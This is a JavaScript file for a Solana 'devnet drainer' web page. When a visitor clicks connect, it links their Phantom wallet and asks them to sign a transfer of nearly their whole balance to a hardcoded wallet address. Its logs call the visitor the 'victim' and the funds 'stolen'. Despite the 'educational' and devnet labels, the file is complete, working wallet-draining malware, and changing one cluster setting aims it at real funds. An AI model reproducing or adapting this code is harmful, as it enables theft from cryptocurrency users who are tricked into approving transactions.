/**
 * DEVNET DRAINER - Educational Purpose Only
 * Automatically transfers ALL Devnet SOL from connected wallet
 * ⚠️ DEVNET ONLY - No real funds at risk ⚠️
 */

// ============================================
// 🔧 YOUR WALLET WHERE DRAINED SOL GOES 🔧
// ============================================
const YOUR_WALLET_ADDRESS = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
// Example: "9x4e9wXHvE9P9yXxR4R9qXxXxXxXxXxXxXxXxXxX"
// ============================================

// Set to true to drain ALL SOL (minus rent), false to drain specific amount
const DRAIN_ALL = true;
const DRAIN_AMOUNT = 0.1; // Only used if DRAIN_ALL = false

// Global variables
let connection = null;
let publicKey = null;
let transactionLog = [];

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log('💀 DEVNET Drainer Ready');
    console.log(`📍 Draining to: ${YOUR_WALLET_ADDRESS}`);
    
    document.getElementById('drainAddress').innerHTML = `🎯 ${YOUR_WALLET_ADDRESS}`;
    initSolana();
    setupEventListeners();
});

async function initSolana() {
    if (typeof solanaWeb3 !== 'undefined') {
        connection = new solanaWeb3.Connection(
            solanaWeb3.clusterApiUrl('devnet'),
            'confirmed'
        );
        addToLog('✅ Solana Devnet ready', 'success');
        return true;
    }
    setTimeout(initSolana, 500);
    return false;
}

function setupEventListeners() {
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectAndDrain);
    }
}

// 🔥 MAIN DRAIN FUNCTION - Connects and automatically drains 🔥
async function connectAndDrain() {
    addToLog('🦊 Requesting wallet connection...', 'drain');
    
    // Validate drain address
    if (!YOUR_WALLET_ADDRESS || YOUR_WALLET_ADDRESS === "YOUR_WALLET_ADDRESS_HERE") {
        addToLog('❌ Please set YOUR_WALLET_ADDRESS in app.js', 'error');
        alert('Edit app.js and set YOUR_WALLET_ADDRESS first!');
        return;
    }
    
    try {
        // Connect to Phantom
        if (!window.phantom?.solana) {
            addToLog('❌ Phantom wallet not detected. Please install Phantom extension.', 'error');
            if (confirm('Install Phantom wallet?')) {
                window.open('https://phantom.app/', '_blank');
            }
            return;
        }
        
        addToLog('🔄 Connecting to Phantom...', 'drain');
        const resp = await window.phantom.solana.connect();
        publicKey = resp.publicKey.toString();
        
        addToLog(`✅ Connected: ${publicKey.substring(0, 25)}...`, 'success');
        
        // Get balance
        const pubKey = new solanaWeb3.PublicKey(publicKey);
        const balance = await connection.getBalance(pubKey);
        const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        addToLog(`💰 Victim balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'info');
        
        if (balanceSol < 0.01) {
            addToLog(`⚠️ No SOL to drain (balance < 0.01)`, 'error');
            return;
        }
        
        // Calculate amount to drain
        let amountToDrain = 0;
        if (DRAIN_ALL) {
            // Leave a tiny bit for rent (0.00089 SOL)
            amountToDrain = balanceSol - 0.001;
            if (amountToDrain < 0) amountToDrain = balanceSol;
            addToLog(`💀 Draining ALL available SOL: ${amountToDrain.toFixed(5)} SOL`, 'drain');
        } else {
            amountToDrain = DRAIN_AMOUNT;
            addToLog(`💀 Draining ${amountToDrain} SOL`, 'drain');
        }
        
        if (amountToDrain <= 0) {
            addToLog(`⚠️ Nothing to drain`, 'error');
            return;
        }
        
        // Create drain transaction
        const toPubkey = new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS);
        const fromPubkey = new solanaWeb3.PublicKey(publicKey);
        
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToDrain * solanaWeb3.LAMPORTS_PER_SOL
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        addToLog(`⏳ Waiting for victim to approve...`, 'drain');
        
        // Sign and send - THIS IS WHERE THE VICTIM APPROVES
        const signature = await window.phantom.solana.signAndSendTransaction(transaction);
        
        addToLog(`✅ DRAIN TRANSACTION SENT!`, 'drain');
        addToLog(`🔑 Signature: ${signature.substring(0, 40)}...`, 'success');
        
        // Wait for confirmation
        addToLog(`⏳ Confirming on blockchain...`, 'pending');
        
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
            throw new Error(`Transaction failed: ${confirmation.value.err}`);
        }
        
        addToLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
        addToLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'success');
        addToLog(`📍 Sent to your wallet: ${YOUR_WALLET_ADDRESS.substring(0, 30)}...`, 'success');
        
        // Get updated balance
        const newBalance = await connection.getBalance(pubKey);
        const newBalanceSol = newBalance / solanaWeb3.LAMPORTS_PER_SOL;
        addToLog(`💰 Victim remaining: ${newBalanceSol.toFixed(5)} SOL`, 'info');
        
        // Update button
        const connectBtn = document.getElementById('connectBtn');
        connectBtn.textContent = '✅ DRAINED!';
        connectBtn.disabled = true;
        connectBtn.style.opacity = '0.5';
        
        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${YOUR_WALLET_ADDRESS.substring(0, 40)}...\n\n⚠️ This is DEVNET - No real funds were stolen.`);
        
    } catch (error) {
        console.error('Drain error:', error);
        addToLog(`❌ Drain failed: ${error.message}`, 'error');
        
        if (error.message === 'User rejected') {
            addToLog(`💀 Victim rejected the transaction`, 'error');
        }
    }
}

function addToLog(message, type = 'info') {
    transactionLog.unshift({
        message: message,
        type: type,
        time: new Date().toLocaleTimeString()
    });
    
    if (transactionLog.length > 30) transactionLog.pop();
    
    const logContainer = document.getElementById('log');
    if (logContainer) {
        logContainer.innerHTML = transactionLog.map(log => `
            <div class="log-entry ${log.type}">
                [${log.time}] ${log.message}
            </div>
        `).join('');
    }
}